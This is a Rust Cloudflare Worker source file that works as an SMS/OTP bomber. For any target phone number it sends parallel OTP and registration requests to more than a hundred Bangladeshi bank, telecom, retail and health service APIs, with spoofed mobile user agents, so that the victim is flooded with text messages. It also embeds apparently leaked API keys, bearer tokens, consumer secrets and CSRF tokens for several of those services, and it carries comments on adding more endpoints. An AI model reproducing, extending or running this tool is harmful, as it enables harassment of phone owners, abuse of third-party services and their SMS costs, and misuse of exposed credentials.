use worker::*;
use serde_json::{json, Value};
use wasm_bindgen_futures::JsFuture;
use wasm_bindgen::JsValue;

const BLOCKED_NUMBERS: &[&str] = &["01890183516"];

pub fn cors_headers() -> Headers {
    let mut h = Headers::new();
    h.set("Access-Control-Allow-Origin",  "*").unwrap();
    h.set("Access-Control-Allow-Methods", "GET, POST, OPTIONS").unwrap();
    h.set("Access-Control-Allow-Headers", "Content-Type").unwrap();
    h.set("Content-Type", "application/json").unwrap();
    h
}

// Standard JSON POST
async fn fire(name: &'static str, url: &'static str, payload: Value) -> Value {
    let mut init = RequestInit::new();
    init.with_method(Method::Post);
    let mut h = Headers::new();
    h.set("Content-Type",    "application/json").unwrap();
    h.set("User-Agent",      "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 Chrome/120 Mobile Safari/537.36").unwrap();
    h.set("Accept",          "application/json, */*").unwrap();
    h.set("Accept-Language", "en-US,en;q=0.9").unwrap();
    init.with_headers(h);
    init.with_body(Some(payload.to_string().into()));
    exec(name, url, init).await
}

// POST with extra headers
async fn fire_h(name: &'static str, url: &'static str, payload: Value, extra: &[(&'static str, &'static str)]) -> Value {
    let mut init = RequestInit::new();
    init.with_method(Method::Post);
    let mut h = Headers::new();
    h.set("Content-Type",    "application/json").unwrap();
    h.set("User-Agent",      "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 Chrome/120 Mobile Safari/537.36").unwrap();
    h.set("Accept",          "application/json, */*").unwrap();
    for (k, v) in extra { h.set(k, v).unwrap(); }
    init.with_headers(h);
    init.with_body(Some(payload.to_string().into()));
    exec(name, url, init).await
}

// Form-urlencoded POST
async fn fire_form(name: &'static str, url: &'static str, body: &'static str) -> Value {
    let mut init = RequestInit::new();
    init.with_method(Method::Post);
    let mut h = Headers::new();
    h.set("Content-Type", "application/x-www-form-urlencoded").unwrap();
    h.set("User-Agent",   "okhttp/4.10.0").unwrap();
    h.set("Accept",       "application/json, */*").unwrap();
    init.with_headers(h);
    init.with_body(Some(body.into()));
    exec(name, url, init).await
}

// GET request
async fn fire_get(name: &'static str, url: &'static str) -> Value {
    let mut init = RequestInit::new();
    init.with_method(Method::Get);
    let mut h = Headers::new();
    h.set("User-Agent", "Mozilla/5.0").unwrap();
    h.set("Accept",     "application/json, */*").unwrap();
    init.with_headers(h);
    exec(name, url, init).await
}

async fn exec(name: &'static str, url: &'static str, init: RequestInit) -> Value {
    match Request::new_with_init(url, &init) {
        Ok(req) => match Fetch::Request(req).send().await {
            Ok(mut r) => { let s = r.status_code(); json!({"api": name, "status": s, "ok": s==200||s==201||s==202}) }
            Err(_) => json!({"api": name, "status": 0, "ok": false}),
        },
        Err(_) => json!({"api": name, "status": 0, "ok": false}),
    }
}

macro_rules! parallel {
    ($($f:expr),+ $(,)?) => {{
        let js_promises = js_sys::Array::new();
        $(
            js_promises.push(
                &wasm_bindgen_futures::future_to_promise(async move {
                    let v = $f.await;
                    Ok(JsValue::from_str(&v.to_string()))
                })
            );
        )+
        let all = js_sys::Promise::all(&js_promises);
        let results_js = JsFuture::from(all).await.unwrap_or(JsValue::NULL);
        let arr = js_sys::Array::from(&results_js);
        let mut out: Vec<Value> = Vec::new();
        for i in 0..arr.length() {
            let s = arr.get(i).as_string().unwrap_or_default();
            out.push(serde_json::from_str(&s).unwrap_or(json!({"ok": false})));
        }
        out
    }};
}

pub async fn handle(mut req: Request, _env: &Env) -> Result<Response> {
    let headers = cors_headers();
    if req.method() == Method::Options { return Ok(Response::empty()?.with_headers(headers)); }
    if req.method() != Method::Post    { return Ok(Response::error("POST Only", 405)?.with_headers(headers)); }

    let body: Value = req.json().await.unwrap_or_default();
    let number_str = body.get("number").and_then(|v| v.as_str()).unwrap_or("").trim().to_string();
    if number_str.is_empty() {
        return Ok(Response::ok(json!({"status":"error","message":"Number missing"}).to_string())?.with_headers(headers));
    }

    let is_blocked = BLOCKED_NUMBERS.iter().any(|&b| {
        number_str == b
        || number_str.trim_start_matches('0') == b.trim_start_matches('0')
        || format!("880{}", number_str.trim_start_matches('0')) == b
        || number_str == format!("880{}", b.trim_start_matches('0'))
    });
    if is_blocked {
        return Ok(Response::ok(json!({"status":"blocked","message":"This number is protected.","target":number_str,"success":0,"failed":0,"total":0,"results":[]}).to_string())?.with_headers(headers));
    }

    let number:  &'static str = Box::leak(number_str.clone().into_boxed_str());
    let bd_no:   &'static str = Box::leak(number_str.trim_start_matches('0').to_string().into_boxed_str());
    let bd_full: &'static str = Box::leak(format!("880{}", bd_no).into_boxed_str());
    let plus_bd: &'static str = Box::leak(format!("+88{}", number_str).into_boxed_str());

    // Form bodies
    let form_mojaru:   &'static str = Box::leak(format!("mobile_or_email={}&app_hash_key=hi&app_mode=RELEASE", number_str).into_boxed_str());
    let form_admission:&'static str = Box::leak(format!("mobile={}", number_str).into_boxed_str());
    let form_acure:    &'static str = Box::leak(format!("mobile={}&vtm=28%2F11%2F2023%2C%2022%3A21%3A39", number_str).into_boxed_str());
    let form_doctorlive:&'static str= Box::leak(format!("country_code=880&mobile={}", bd_no).into_boxed_str());
    let form_shl:      &'static str = Box::leak(format!("number={}", number_str).into_boxed_str());

    // GET URLs
    let url_ecourier:  &'static str = Box::leak(format!("https://backoffice.ecourier.com.bd/api/web/individual-send-otp?mobile={}", number_str).into_boxed_str());
    let url_pharmaid:  &'static str = Box::leak(format!("https://shop.pharmaid-rx.com/api/sendSMSRegistration?mobileNumber={}", number_str).into_boxed_str());
    let url_medeasy:   &'static str = Box::leak(format!("https://api.medeasy.health/api/send-otp/+88{}/", number_str).into_boxed_str());
    let url_robi:      &'static str = Box::leak(format!("https://scs.robi.com.bd/api/send-otp?mobile_no={}", number_str).into_boxed_str());
    let url_alg:       &'static str = Box::leak(format!("https://alglimited.com/api/v1/otp-sms-send/{}", number_str).into_boxed_str());
    let url_apon:      &'static str = Box::leak(format!("https://apon.ibos.io/apon/partner/Registration/OTPGenerate?PhoneNumber={}&Typeid=1", number_str).into_boxed_str());
    let url_uzan:      &'static str = Box::leak(format!("https://www.uzanvati.com/user/otp?phone={}", number_str).into_boxed_str());
    let url_binge:     &'static str = Box::leak(format!("https://web-api.binge.buzz/api/v3/otp/send/+88{}", number_str).into_boxed_str());
    let url_gpcin:     &'static str = Box::leak(format!("https://api.mygp.cinematic.mobi/api/v1/send-common-otp/wap/88{}", bd_no).into_boxed_str());

    let api_results = parallel![

        // ════════════════════════════════════════════
        //  STANDARD JSON POST APIs
        // ════════════════════════════════════════════
        fire("Shadhin Music",    "https://coreapi.shadhinmusic.com/api/v5/otp/OtpRobiReq",          json!({"msisdn": bd_full, "shortcode": 16235, "servicename": "Shadhin Music"})),
        fire("Khaodao",          "https://api.eat-z.com/auth/customer/app-connect",                  json!({"username": plus_bd})),
        fire("Walton Plaza",     "https://waltonplaza.com.bd/api/auth/otp/create",                   json!({"auth": {"countryCode": "880", "deviceUuid": "ee757830-f639-12f0-9f4d-2f972746fhg", "phone": bd_no}, "captchaToken": "recapcha"})),
        fire("Apex4u",           "https://api.apex4u.com/api/auth/login",                            json!({"phoneNumber": number})),
        fire("Nexopet",          "https://host03pet.nexopet.com/api/v1.0/users/send-otp",            json!({"phone": number})),
        fire("AWS POC",          "https://8t09wa0n0a.execute-api.ap-south-1.amazonaws.com/poc/api/v1/otp/send", json!({"phone": number})),
        fire("Otithee",          "https://gateway.otithee.com/api/v1/generate-otp",                 json!({"request_type": "registration", "mobile_number": number})),
        fire("Mojaru Login",     "https://new.mojaru.com/api/student/login",                         json!({"mobile_or_email": number})),
        fire("GP MyGP",          "https://appcity.grameenphone.com/proxy/v2/user/session/get-otp",   json!({"mobileNumber": number})),
        fire("Upay 1",           "https://api.upaysystem.com/dfsc/oam/app/v1/wallet-verification-init/", json!({"wallet_number": number, "geo_location": {"lat": 23.8979093, "long": 89.1356346}, "referral": "", "firebase_token": "e7XC0AWRR5C6rGMm6yCaZ8:APA91bHnbvs1bA_qXXb55W9GmsKmuzAUkgaR770HBH9hZCLjFV6HCejAsRGggvnD7c5dv2q_pOAdwY1peeTlzzn49cjPESTZ0NdR-bIhwe9_6of6rosH0AI", "device_uuid": "c65m117a8cbf5b1851b29f8b", "mno": "Robi"})),
        fire("Upay 2",           "https://api.upaysystem.com/dfsc/oam/app/v1/wallet-verification-init/", json!({"device_uuid": "c65m117af809e65fe70dc986", "firebase_token": "ei4LX14HQzmGfRXP_Nz5et:APA91bGs4IBgyO6qNJqCEKnY4ctWNTI7m10Emt0FLf4M5Mv2RwvbuJdT_O8OC37zIVXa2jb9Zhi8FldVfOs_ev3dL8PLWMboYDaMK_6gETBqQ1KloDL0W1aew9QCG8362WFckHa7txKm", "geo_location": {"lat": 0.0, "long": 0.0}, "mno": "Airtel", "wallet_number": number, "referral": ""})),
        fire("Chorki",           "https://api-dynamic.chorki.com/v2/auth/login?country=BD&platform=web&language=en", json!({"number": plus_bd})),
        fire("Deepto Play",      "https://api.deeptoplay.com/v2/auth/login?country=BD&platform=web&language=en", json!({"number": plus_bd})),
        fire("Bioscope Live",    "https://api-dynamic.bioscopelive.com/v2/auth/login?country=BD&platform=web&language=en", json!({"number": plus_bd})),
        fire("RedX",             "https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp", json!({"phoneNumber": number})),
        fire("Bohubrihi",        "https://bb-api.bohubrihi.com/public/activity/otp",                json!({"phone": number, "intent": "login"})),
        fire("GP Shop",          "https://bkshopthc.grameenphone.com/api/v1/fwa/request-for-otp",   json!({"phone": number, "language": "en", "email": ""})),
        fire("Shikho OTP",       "https://api.shikho.com/public/activity/otp",                      json!({"phone": number, "intent": "ap-discount-request"})),
        fire("Shikho Auth",      "https://api.shikho.com/auth/v2/send/sms",                         json!({"adjust_id": "", "google_ads_id": "", "auth_type": "signup", "phone": number, "type": "student", "vendor": "shikho"})),
        fire("iEducation BD",    "https://www.ieducationbd.com/api/account/check_user",             json!({"mobile": number})),
        fire("Easy BD Reg",      "https://core.easy.com.bd/api/v1/registration",                    json!({"name": "Rahat", "email": "chowa@gmail.com", "mobile": number, "password": "123456", "password_confirmation": "123456", "device_key": "48b1f7061f48c950090220f62128b2c3"})),
        fire("MyGuardian BD",    "https://gliapp.myguardianbd.com/auth-gate/api/access/send-otp",   json!({"mobileNumber": number, "type": null})),
        fire("Gorilla Move",     "https://api.gorillamove.com/api/v1/core/account/phone_login",      json!({"phone_number": number, "step": 1})),
        fire("NRB Bazaar",       "https://www.nrbbazaar.com/Customer/RequestOtpForRegistration",    json!({"phoneNumber": number, "email": "example@gmail.com", "__RequestVerificationToken": "CfDJ8OTdK55f1KtKpMVto1XODz36P2tWXfyeot9aYuxWqkd81qABD_JFUva73ce2L5ftYmqCgwInZKUHisKU3mWb6DkYgBFDg4QIej8YwHP3BQ3fQvgBfc6mbMjVua7p-AT4MEPtgYhLexJmTxl7enCosqA"})),
        fire("Medico Bio",       "https://api.v2.medico.bio/patient/passwordless-login",            json!({"phoneNumber": number, "deviceId": number, "channel": "web", "userType": "patient", "type": "newUser"})),
        fire("Paymaster BD",     "https://ap.paymasterbd.net/login_registration/",                  json!({"phone_number": number, "fcm_key": "", "device_id": "b5f0985eb84c4bfa", "sms_hash_code": "s2//QkN6BpW"})),
        fire("Relaxy BD",        "https://dev.api.relaxy.com.bd/api/v1/otp/send",                   json!({"phoneNumber": plus_bd, "appSignature": "appSignature"})),
        fire("Porter BD",        "https://customerapp-gateway-ktor.prod.porter.ae/onboarding/customer/signup", json!({"phone": number})),
        fire("FSIB Freedom",     "https://freedom.fsiblbd.com/verifidext/api/CustOnBoarding/VerifyMobileNumber", json!({"AccessToken": "", "TrackingNo": "", "mobileNo": number, "otpSms": "", "product_id": "131", "requestChannel": "MOB", "trackingStatus": 5})),
        fire("Fundesh",          "https://fundesh.com.bd/api/auth/generateOTP",                     json!({"msisdn": bd_no})),
        fire("Ghoori Learning",  "https://api.ghoorilearning.com/api/auth/signup/otp?_app_platform=web&_lang=bn", json!({"mobile_no": number})),
        fire("ExpressHub",       "https://expresshub.com.bd/User/CreateNewUser",                    json!({"_UID": number, "_UNAME": "0", "_MAIL": "0", "_PHONE": "0", "_PASS": "0", "_TYPE": "1"})),
        fire("Practice Club",    "https://www.practiceclub.net/api/register",                       json!({"contact_no": number})),
        fire("Quality Foods",    "https://admin.qualityfoods.com.bd/api/auth/check-phone",          json!({"phone": number, "is_sign_in": 0, "login_type": "phone"})),
        fire("PBS BD",           "https://pbs.com.bd/login/?handler=UserGetOtp",                    json!({"UserName": "", "UserPassword": "", "MobileNo": number})),
        fire("Dutch Bangla NX",  "https://nxpay1.dutchbanglabank.com/user/register",                json!({"aspId": "5678", "locale": "EN", "msisdn": number, "registrationUserId": number, "tcidList": [50], "telcoId": "GP"})),
        fire("One Fish",         "https://api.onefish.app/api/auth/user/sendotp",                   json!({"phone": number})),
        fire("Hishabee",         "https://distribution.hishabee.business/api/app/v1/auth/number-check", json!({"mobile_number": number})),
        fire("English Moja",     "https://api.englishmojabd.com/api/v1/auth/login",                 json!({"phone": plus_bd})),
        fire("Sundarban Courier","https://api-gateway.sundarbancourierltd.com/graphql",             json!({"operationName": "CreateAccessToken", "variables": {"accessTokenFilter": {"userName": number}}, "query": "mutation CreateAccessToken($accessTokenFilter: AccessTokenInput!) { createAccessToken(accessTokenFilter: $accessTokenFilter) { message statusCode } }"})),
        fire("Osud Kini",        "https://api.osudkini.com/api/otp/generate-otp",                   json!({"phoneNo": number})),
        fire("ABC Lit",          "https://abclit.com/api/sendOTP",                                  json!({"recipientNo": number, "code": 1234})),
        fire("Pathao Auth",      "https://api.pathao.com/v2/auth/register",                         json!({"country_prefix": "880", "national_number": bd_no, "country_id": 1})),
        fire("Focallure BD",     "https://store.focallurebd.com/api/v1/1/ecom/auth/getCode",        json!({"mobile": number})),
        fire("Wholesale Plus",   "https://admin.wholesaleplus.com.bd/api/send-otp/",                json!({"email": number, "regi": true})),
        fire("Motion View",      "https://api.motionview.com.bd/api/send-otp-phone-signup",         json!({"phone": number})),
        fire("QPay BD",          "https://identity01.qpaybd.com.bd/api/v1/verification/phone",      json!({"Id": number})),
        fire("Amiprobashi",      "https://www.amiprobashi.com/api/v7/en/auth/send-otp",             json!({"device_type": "1", "username": plus_bd, "for": "1", "type": "1", "bd_number": "1"})),
        fire("Bepari App",       "https://api.bepari.app/bestfreshfarm/api/V1.4/access-control/user/registerOtp", json!({"client_id": 4, "client_secret": "zCzOixaOJ4JywQr1VsowGZhCaEbZ49WLxweNBgPK", "mobile_no": number})),
        fire("Training Gov BD",  "https://training.gov.bd/backoffice/api/user/sendOtp",             json!({"mobile": number})),
        fire("ILYN Global",      "https://api.ilyn.global/auth/signup",                             json!({"phone": {"code": "BD", "number": number}, "provider": "sms"})),
        fire("WinBaji",          "https://userapi.fairbet91.com/api/RegisterUser/GenerateOTPV2",    json!({"Mobile": number, "SiteCode": "WBJ"})),
        fire("Walton Amar Awaz", "https://walton-amar-awaz-prod.com/api/user/signup",               json!({"email": "", "fbId": "", "fullName": "User", "gId": "", "phone": number})),
        fire("ACS Future School","https://auth.acsfutureschool.com/api/v1/otp/send",                json!({"phone": number})),
        fire("Meena Bazar",      "https://meenabazardev.com/api/mobile/front/send/otp",             json!({"CellPhone": number, "type": "login"})),
        fire("Osudpotro",        "https://api.osudpotro.com/api/v1/users/send_otp",                 json!({"mobile": plus_bd, "deviceToken": "web", "language": "en", "os": "web"})),
        fire("Dmoney",           "https://napi.dmoney.com.bd:6066/DmoneyPlatform/um_public_ekyc_checkMobileEmail", json!({"ekycApplicationData": {"emailId": "", "id": 0, "mobileNumber": number, "productCode": "FS"}, "channel": "ANDROID_APP", "productCode": "FS"})),
        fire("Bacbon Tutors",    "https://api.bacbontutors.com/V2/student/pre-register",            json!({"name": "12345", "mobile_no": number, "email": "", "referred_code": null, "app_signature": "BacBon Tutors"})),
        fire("BDKepler",         "https://api.bdkepler.com/api_middleware-0.0.1-RELEASE/registration-generate-otp", json!({"deviceId": "7dtdhid45c0f0901", "deviceInfo": {"deviceInfoSignature": "D0923F3GDHJXJDTIHFDTIGGHURHFATI7605A3FA", "deviceId": "7d8b0agi0g0f0901", "firebaseDeviceToken": "", "manufacturer": "MI", "modelName": "NOTE 10", "osName": "Android", "osVersion": "10", "rootDevice": 0}, "operator": "88", "walletNumber": number})),
        fire("Shomvob",          "https://backend-api.shomvob.co/api/v2/otp/phone?is_retry=0",     json!({"phone": bd_full})),
        fire("Kirei BD",         "https://app.kireibd.com/api/v2/send-login-otp",                  json!({"email": number})),
        fire("Doctime",          "https://us-central1-doctime-465c7.cloudfunctions.net/sendAuthenticationOTPToPhoneNumber", json!({"data": {"country_calling_code": "88", "contact_no": number, "headers": {"PlatForm": "Web"}}})),
        fire("Ecom Rangs",       "https://ecom.rangs.com.bd/send-otp-code",                        json!({"mobile": plus_bd, "type": 1})),
        fire("Sasthyaseba",      "https://sasthyaseba.com/register/q-data.json?qaction=id_d401qvL6ESs", json!({"type": "send-otp", "phone": plus_bd, "email": "", "name": "Rahat", "gender_id": 1})),
        fire("Picky BD",         "https://api.picky.com.bd/api/user/v2/customer/send-otp-for-login", json!({"phone": plus_bd})),
        fire("Ezybank DBBL",     "https://ezybank.dhakabank.com.bd/VerifIDExt2/api/CustOnBoarding/VerifyMobileNumber", json!({"AccessToken": "", "TrackingNo": "", "mobileNo": number, "otpSms": "", "product_id": "110", "requestChannel": "MOB", "trackingStatus": 5})),
        fire("Uttara Bank",      "https://ibanking.uttarabank-bd.com/verifidext/api/CustOnBoarding/VerifyMobileNumber", json!({"AccessToken": "", "TrackingNo": "", "mobileNo": number, "otpSms": "", "product_id": "111", "requestChannel": "MOB", "trackingStatus": 5})),
        fire("MTB eKYC",         "https://mtbekyc.mutualtrustbank.com/Home/Register",              json!({"name": "-", "email": "t73@gmail.com", "mobile": number, "Password": "@Si123", "confirmPass": "@Si123", "__RequestVerificationToken": "CfDJ8H7XjXqOELtNgtQBTDTqOlXFlRqFhsADROj8xWdH6mBP6FaWtdbwUKtJY1rqBv2RlbOBMLba9p3HX3E1NO8AfKOmi3Mcj7lnY4gThTAhIPL5YLLEBiYd3S5GxrxgZim2QgklsskL8BxkmFKCWi73lr4"})),
        fire("mKiddo",           "https://api.mkiddo.com/api/V2/send-otp",                         json!({"app_signature": "DMSfFDCvin4", "app_name": "mKiddo_v%3A2.6.4", "source": "app", "msisdn": number})),
        fire("Goldkinen",        "https://api.goldkinen.com/api/v2/auth/request-otp/",             json!({"phone_number": number, "scope": "registration", "is_resend": false})),
        fire("Wearnsmile",       "https://app.wearnsmile.com.bd/api/v1/1/ecom/auth/getCode",       json!({"mobile": number})),
        fire("Deshal",           "https://app.deshal.net/api/auth/login",                          json!({"phone": number})),
        fire("BD Tickets",       "https://api.bdtickets.com:20100/v1/auth",                        json!({"createUserCheck": true, "phoneNumber": plus_bd, "applicationChannel": "WEB_APP"})),
        fire("NBL Account",      "https://accountnow.nblbd.com/api/otp-request",                   json!({"mobile": number})),
        fire("BDBL eAccount",    "https://eaccount.bdbl.com.bd:31091/api/mobile/onboarding/CustomerMobileOTPGenerate", json!({"BusinessData": {"MobileNumber": plus_bd}})),
        fire("Lefabre BD",       "https://api.lefabrebd.com/api/v1/customer/register",             json!({"name": "Chowa", "phone": number, "password": "123456"})),
        fire("Amar Doctor",      "https://hhcjmpjdld.execute-api.ap-southeast-1.amazonaws.com/prod/accounts/user/continue_with_phone", json!({"phone": number, "user_type": "patient", "send_msg": true})),
        fire("Moveon BD",        "https://moveonbd.com/api/v1/customer/auth/phone/request-otp",    json!({"phone": number})),
        fire("Karobar App",      "https://backend.karobarapp.com/auth/phone-login/",               json!({"phone_number": bd_no, "os": "Android", "country": "bangladesh"})),
        fire("Klassy BD",        "https://api.klassy.com.bd/api/v2/public/user/register/send/otp", json!({"phone": number})),
        fire("Rangs Motors",     "https://api.rangsmotors.com/",                                   json!({"u_num": number})),
        fire("QFood",            "https://qfood.com.bd/api/send-otp",                              json!({"mobileNumber": plus_bd})),
        fire("Hungry Express",   "https://hungry.express/api/v1/auth/login",                       json!({"phone": plus_bd, "login_type": "otp", "guest_id": "22860"})),
        fire("V88BD",            "https://www.v88bd.com/en/api/sendOtp",                           json!({"phone": number, "otpMethod": "register", "fingerprint": "0593256e7c6c6d969b479d6f10e5bf4b"})),
        fire("Letsbett",         "https://www.letsbett.com/wps/verification/sms/register",         json!({"mobileNo": number, "countryDialingCode": "880"})),
        fire("BPP Shop",         "https://backend.bppshop.com.bd/api/v1/auth/send",                json!({"phone": number})),
        fire("Chardike",         "https://api.chardike.com/api/otp/send",                          json!({"phone": number, "otp_type": "login"})),
        fire("Garibook",         "https://api.garibookadmin.com/api/v3/user/login",                json!({"mobile": number, "gb_code": "IKiyBy55yYkaF8U"})),
        fire("Softmax Manager",  "https://softmaxmanager.xyz/api/v1/user/request/otp/",            json!({"phone_number": plus_bd, "app_signature": "Fu89B+dY9dz", "location": "Null", "device_name": "", "device_id": "TKQ1.221114.001", "android_version": "13"})),
        fire("TallyKhata",       "https://web.tallykhata.com/api/auth/init",                       json!({"app_version_number": 165, "bp_code": "", "device_id": "5cd4397b-9b30-4604-91a3-e39cbf126d7e", "mobile": number, "request_type": "LOGIN"})),
        fire("Icanopy Share",    "https://asia-south1-share-c8bbf.cloudfunctions.net/signUpPhoneCheck", json!({"data": {"userHashKey": "3F4518827F757D23D12F6CE8B8D5BFE5", "method": "init", "apiMd5": "41a84f1bd4b800c9e774ac3932635fbd", "phone": number, "phoneEn": "ED37DA69D0BA5209F3FC21F45548EF1C", "deviceId": "9eb5fa822a01b1ed"}})),
        fire("Bepari 2",         "https://api.ilyn.global/auth/signup",                            json!({"phone": {"code": "BD", "number": number}, "provider": "sms"})),

        // ════════════════════════════════════════════
        //  SPECIAL HEADER APIs
        // ════════════════════════════════════════════
        fire_h("Munchies BD",    "https://api.munchies.com.bd/parse/functions/generateOtp",        json!({"phone": number}),    &[("x-parse-application-id", "food")]),
        fire_h("Relaxy XKey",   "https://dev.api.relaxy.com.bd/api/v1/otp/send",                  json!({"phoneNumber": plus_bd, "appSignature": "appSignature"}), &[("x-api-key", "6yjOGvakSbHjA64NGqo7m25TBC4WX8BauAXEP3dX")]),
        fire_h("QuizGiri",       "https://developer.quizgiri.xyz/api/v2.0/send-otp",              json!({"phone": bd_no, "country_code": "+880"}), &[("x-api-key", "gYsiNSVBDuCt8yMUXpF06iQ1eDrMGv6G")]),
        fire_h("Shomvob Auth",   "https://backend-api.shomvob.co/api/v2/otp/phone?is_retry=0",    json!({"phone": bd_full}),   &[("Authorization", "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IlNob212b2JUZWNoQVBJVXNlciIsImlhdCI6MTY2MzMzMDkzMn0.4Wa_u0ZL_6I37dYpwVfiJUkjM97V3_INKVzGYlZds1s")]),
        fire_h("Hoichoi TV",     "https://prod-api.viewlift.com/identity/signup?site=hoichoitv",  json!({"phoneNumber": plus_bd, "requestType": "send", "whatsappConsent": false}), &[("x-api-key", "PBSooUe91s7RNRKnXTmQG7z3gwD2aDTA6TlJp6ef")]),
        fire_h("Meyeghor",       "https://meyeghor.com/wp-json/digits/v1/send_otp",               json!({"countrycode": "+880", "mobileNo": number, "type": "register", "email": "dangerousboytushar@gmail.com"}), &[("Authorization", "Basic Y2tfNzk3MzQ0NzljZWUxZTU2Y2M1MjBkODczOTkxZGRhYjE5ZTMwYzQyMzpjc18xMmE5ODFkODYzMmE1NDMyMzMzNmY0YWNmNWVkNjYxNmQzM2JkNTU2"), ("Timedifference", "360"), ("X-API-Version", "1.1")]),
        fire_h("Smart Ukil",     "https://smartukil.com/api/send-verification-code",              json!({"phone": number}),    &[("authorization", "ergjvbner234erv%^&hjb23QQ!FL*qpdjfweufhjvYUH%^&hj367^&*bedvhjb%^&RhjkbwerfIHVyIy!6XC3E")]),
        fire_h("WafiLife",       "https://m-backend.wafilife.com/wp-json/wc/v2/send-otp",        json!({"p": bd_full}),       &[("consumer_key", "ck_e8c5b4a69729dd913dce8be03d7878531f6511ff"), ("consumer_secret", "cs_f866e5c6543065daa272504c2eea71044579cff3")]),
        fire_h("China Token",    "https://chinaonlinebd.com/api/login/getOtp",                    json!({"phone": number}),    &[("Token", "45601f3d391886fcec5f5a3f26780f21")]),
        fire_h("Babuland",       "http://apps.babuland.org/bblapi/apiv2/apiv5/bbl_api_user_otp", json!({}),                   &[("mobileno", plus_bd), ("otpcode", "111135"), ("branchid", "6")]),

        // ════════════════════════════════════════════
        //  FORM-URLENCODED POST APIs
        // ════════════════════════════════════════════
        fire_form("Mojaru Form",    "https://new.mojaru.com/api/student/login-registration", form_mojaru),
        fire_form("AdmissionPro",   "https://admissionprostuti.com/api/app/otp-sent?fromApp=true", form_admission),
        fire_form("Acure BD",       "https://acurebd.com/users/ajax_otpsms",                 form_acure),
        fire_form("Doctor Live BD", "https://doctorlivebd.com/api/patient/auth/otpsend",     form_doctorlive),
        fire_form("SHL BD",         "https://shl.com.bd/api/appapi/sendOTP",                 form_shl),

        // ════════════════════════════════════════════
        //  GET REQUEST APIs
        // ════════════════════════════════════════════
        fire_get("ECourier",        url_ecourier),
        fire_get("Pharmaid RX",     url_pharmaid),
        fire_get("Medeasy Health",  url_medeasy),
        fire_get("Robi SCS",        url_robi),
        fire_get("ALG Limited",     url_alg),
        fire_get("Apon IBOS",       url_apon),
        fire_get("Uzanvati",        url_uzan),
        fire_get("Binge Buzz",      url_binge),
        fire_get("GP Cinematic",    url_gpcin),

        // ════════════════════════════════════════════
        //  নতুন API যোগ করো এখানে:
        //
        //  JSON POST:
        //  fire("নাম", "https://url", json!({"phone": number})),
        //
        //  Extra headers:
        //  fire_h("নাম", "https://url", json!({"phone": number}), &[("Header", "Value")]),
        //
        //  Form data:
        //  fire_form("নাম", "https://url", Box::leak(format!("phone={}", number_str).into_boxed_str())),
        //
        //  GET:
        //  fire_get("নাম", Box::leak(format!("https://url?phone={}", number_str).into_boxed_str())),
        // ════════════════════════════════════════════
    ];

    let success = api_results.iter().filter(|r| r["ok"].as_bool().unwrap_or(false)).count() as u32;
    let failed  = api_results.len() as u32 - success;

    Ok(Response::ok(json!({
        "status":  "executed",
        "target":  number_str,
        "success": success,
        "failed":  failed,
        "total":   success + failed,
        "results": api_results
    }).to_string())?.with_headers(headers))
}
